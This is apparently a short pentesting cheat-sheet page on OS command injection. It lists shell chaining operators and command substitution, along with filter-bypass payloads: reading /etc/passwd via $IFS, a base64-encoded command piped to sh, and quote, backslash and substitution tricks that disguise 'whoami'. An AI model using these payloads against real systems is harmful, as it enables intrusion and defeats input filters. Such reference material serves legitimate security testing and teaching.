---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Command Injection

## Chaining and Invoking

```powershell
;    # Executes one command and then another
&    # Executes a command in the background, followed by the other one
|    # Redirects the output the first command as input to the second command
&&   # Executes the second command if the first command succeeds
||   # Executes the second command if the first command fails
```

Its also possible to inject command via **command substitution**, where the output of a command is captured and used in another context

```bash
$(command)    # Both windows and linux systems
`command`     # Only linux systems
```

## Bypasses

* [https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)
* [https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#filter-bypasses](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#filter-bypasses)

### Space Bypass

Avoid using spaces with **Internal Field Separator** `$IFS` . The default value of IFS is a space, a tab, and a newline.

```bash
cat$IFS/etc/passwd
```

```bash
# Only works in bash
{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|sh
```

### Blacklisted Words

```bash
# Quotes ' / "
w'h'o'a'm'i'     # Both windows and linux systems
wh''oami         # Both windows and linux systems
'w'h'o'a'm'i     # Only linux systems

# Backslashes
\w\h\o\a\m\i     # Only linux systems
w\h\o\a\m\i      # Only linux systems

# $()
wh$()oami        # Only linux systems
wh$(echo oa)mi   # Only linux systems

# ``
wh``oami         # Only linux systems
wh`echo oa`mi    # Only linux systems

# $@
wh$@oami         # Only linux systems
```

## References

[https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#filter-bypasses)\
[https://book.hacktricks.xyz/pentesting-web/command-injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
